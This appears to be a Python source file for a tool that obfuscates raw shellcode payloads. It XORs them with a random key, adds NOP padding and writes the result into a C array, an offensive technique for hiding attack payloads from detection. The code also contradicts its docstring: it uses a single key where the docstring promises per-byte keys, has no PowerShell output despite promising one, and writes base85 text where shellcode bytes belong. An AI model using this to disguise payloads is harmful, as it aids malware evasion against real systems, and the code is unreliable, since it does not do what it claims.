# File: tools/shellcode_gen.py

"""
Generates polymorphic shellcode from a raw payload binary:
• Randomizes XOR keys per‑byte.
• Pads with random NOP slides.
• Outputs a C array or PowerShell snippet.
"""

import sys
import random
import base64

def generate_polymorphic_shellcode(input_bin: str, output_c: str):
    raw = open(input_bin, "rb").read()
    xor_key = random.randint(1, 255)
    obf = bytes(b ^ xor_key for b in raw)
    # NOP pad at front and back
    pad_len = random.randint(16, 64)
    obf = bytes([0x90]*pad_len) + obf + bytes([0x90]*pad_len)
    enc = base64.b85encode(obf)
    with open(output_c, "w") as f:
        f.write("// AUTO‑GENERATED polymorphic shellcode\n")
        f.write(f"unsigned char shellcode[] = \"{enc.decode()}\"; // XOR key={xor_key}, pad={pad_len}\n")
    print(f"Generated {output_c} with key={xor_key}")
